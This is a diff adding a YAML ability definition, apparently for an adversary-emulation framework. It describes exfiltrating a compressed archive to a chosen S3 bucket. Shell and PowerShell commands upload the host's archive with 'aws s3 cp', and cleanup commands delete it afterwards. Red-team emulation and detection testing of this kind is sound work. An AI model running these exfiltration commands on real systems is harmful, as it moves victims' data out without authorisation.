@@ -1,0 +1,70 @@
+- singleton: false
+  name: Exfil Compressed Archive to S3 via AWS CLI
+  access: {}
+  tactic: exfiltration
+  requirements:
+  - module: plugins.stockpile.app.requirements.paw_provenance
+    relationship_match:
+    - source: host.dir.compress
+  repeatable: false
+  buckets:
+  - exfiltration
+  additional_info: {}
+  technique_id: T1567.002
+  privilege: ''
+  delete_payload: true
+  executors:
+  - parsers: []
+    name: sh
+    build_target: null
+    payloads: []
+    timeout: 60
+    variations: []
+    cleanup:
+    - 'LocalFile=''#{host.dir.compress}'';
+
+      RemoteName="exfil-#{paw}-$(basename $LocalFile)";
+
+      aws s3 rm s3://#{s3.source.name}/$RemoteName;'
+    additional_info: {}
+    command: 'LocalFile=''#{host.dir.compress}'';
+
+      RemoteName="exfil-#{paw}-$(basename $LocalFile)";
+
+      aws s3 cp #{host.dir.compress} s3://#{s3.source.name}/$RemoteName;'
+    platform: linux
+    code: null
+    language: null
+    uploads: []
+  - parsers: []
+    name: psh
+    build_target: null
+    payloads: []
+    timeout: 60
+    variations: []
+    cleanup:
+    - '$SourceFile = (Get-Item #{host.dir.compress});
+
+      $RemoteName = "exfil-#{paw}-$($SourceFile.name)";
+
+      aws s3 rm s3://#{s3.source.name}/$RemoteName;'
+    additional_info: {}
+    command: '$SourceFile = (Get-Item #{host.dir.compress});
+
+      $RemoteName = "exfil-#{paw}-$($SourceFile.name)";
+
+      aws s3 cp #{host.dir.compress} s3://#{s3.source.name}/$RemoteName;'
+    platform: windows
+    code: null
+    language: null
+    uploads: []
+  technique_name: Exfiltration to Cloud Storage
+  plugin: stockpile
+  description: 'Exfiltrate the compressed archive to the provided S3 bucket using
+    the AWS CLI. It is assumed that the user
+
+    credentials configured with AWS CLI have the proper permissions to write to the
+    target S3 bucket.
+
+    '
+  id: e7bf5dc7-62e4-48b2-acf8-abaf8734c19c
